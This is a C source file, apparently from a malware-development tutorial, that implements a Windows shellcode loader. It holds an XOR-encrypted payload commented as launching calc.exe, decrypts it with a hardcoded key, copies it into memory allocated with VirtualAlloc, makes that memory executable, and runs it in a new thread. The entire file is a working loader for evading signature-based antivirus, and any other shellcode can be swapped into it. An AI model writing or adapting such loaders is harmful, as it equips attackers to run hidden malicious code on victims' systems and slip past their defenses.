#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// our payload calc.exe
unsigned char my_payload[] = 
"\x94\x2d\xef\x88\x9f\x89\xa2\x63\x64\x65\x27\x39\x24\x3c\x3e\x3e\x37\x2a\x52\xb6\x0\x2e\xe3\x37\xc\x24\xe4\x33\x7a\x2b\xef\x37\x46\x20\xee\x1e\x3c\x27\x6e\xd5\x29\x2e\x28\x57\xa1\x2d\x5d\xac\xc3\x5d\x3\x1f\x66\x49\x46\x29\xa4\xa5\x61\x2e\x60\xa3\x81\x89\x37\x27\x39\x2d\xe7\x3e\x4f\xea\x20\x5f\x2c\x64\xb6\xe3\xe5\xe4\x6c\x6f\x61\x2a\xe6\xa4\x11\x1\x20\x64\xbc\x3c\xe4\x29\x7a\x27\xef\x25\x46\x21\x64\xbc\x8f\x39\x29\x9d\xaa\x25\xee\x52\xe0\x2d\x6d\xba\x22\x50\xab\x2b\x55\xa5\xca\x29\xa4\xa5\x61\x2e\x60\xa3\x5b\x84\x10\x97\x24\x66\x20\x48\x67\x24\x5b\xb2\x11\xbd\x3e\x2c\xee\x2c\x48\x26\x60\xb2\x5\x25\xee\x6a\x20\x21\xe7\x2c\x73\x28\x63\xb3\x25\xee\x62\xe0\x2d\x6d\xbc\x2e\x39\x23\x3b\x3a\x3c\x3c\x29\x3d\x2d\x35\x2e\x3b\x2a\xe0\x88\x45\x27\x3a\x9a\x8c\x34\x2e\x38\x38\x2b\xef\x77\x8f\x3f\x9a\x93\x93\x32\x28\xdc\x14\x17\x57\x39\x5b\x57\x6c\x6c\x2e\x37\x2b\xea\x82\x2d\xe7\x84\xc5\x6d\x6c\x6f\x28\xeb\x86\x2d\xd9\x64\x68\x74\x30\xac\xc7\x60\x65\x22\x30\x2c\xef\x8c\x29\xe5\x9d\x2e\xdb\x2e\x14\x42\x62\x99\xbd\x29\xe5\x86\x7\x60\x63\x63\x64\x3c\x27\xd2\x4c\xec\x7\x6f\x9e\xb7\x33\x34\x28\x57\xa1\x28\x5d\xac\x27\x9e\xa2\x2b\xed\xa7\x2e\x97\xa5\x24\xe5\xae\x20\xd8\x89\x6b\xba\x86\x97\xb0\x24\xe5\xa8\xb\x72\x22\x3c\x29\xef\x8a\x2d\xe5\x95\x2e\xdb\xfb\xc6\x10\x4\x99\xbd\x2d\xed\xa8\x2f\x63\x62\x63\x2d\xdd\x5\x5\x1\x6c\x6c\x6f\x61\x62\x22\x34\x24\x36\x20\xec\x8e\x3b\x38\x36\x2f\x52\xa4\xf\x6b\x31\x24\x3c\x8e\x93\x7\xa5\x27\x40\x31\x67\x69\x2d\xe1\x28\x4b\x79\xa4\x63\xc\x2d\xef\x8e\x33\x3c\x2d\x3f\x20\x32\x22\x34\x2c\x99\xa8\x24\x3c\x25\x90\xa9\x2f\xea\xa5\x29\xef\xa9\x24\xd6\x15\xa3\x5e\xe4\x9c\xb1\x2d\x57\xba\x2d\x93\xa6\xe4\x6f\x23\xd9\x6c\xe2\x7b\x8\x9a\xb9\xd7\x9f\xd4\xc0\x35\x25\xdf\xc0\xfd\xd8\xf1\x93\xba\x29\xe1\xa7\x4c\x59\x60\x14\x6f\xec\x97\x8f\x14\x67\xd8\x23\x76\x14\x7\xf\x6c\x35\x2e\xe8\xb8\x9c\xb1";
            
unsigned int my_payload_len = sizeof(my_payload);

// key for XOR decrypt
char my_secret_key[] = "helloabcdef";

// decrypt deXOR function
void XOR(char * data, size_t data_len, char * key, size_t key_len) {
    int j;
    j = 0;
    for (int i = 0; i < data_len; i++) {
            if (j == key_len - 1) j = 0;

            data[i] = data[i] ^ key[j];
            j++;
    }
}

int main(void) {
  void * my_payload_mem; // memory buffer for payload
  BOOL rv;
  HANDLE th;
  DWORD oldprotect = 0;

  // Allocate a memory buffer for payload
  my_payload_mem = VirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

  XOR((char *) my_payload, my_payload_len, my_secret_key, sizeof(my_secret_key));

  // copy payload to buffer
  RtlMoveMemory(my_payload_mem, my_payload, my_payload_len);

  // make new buffer as executable
  rv = VirtualProtect(my_payload_mem, my_payload_len, PAGE_EXECUTE_READ, &oldprotect);
  if ( rv != 0 ) {

    // run payload
    th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) my_payload_mem, 0, 0, 0);
    WaitForSingleObject(th, -1);
  }
  return 0;
}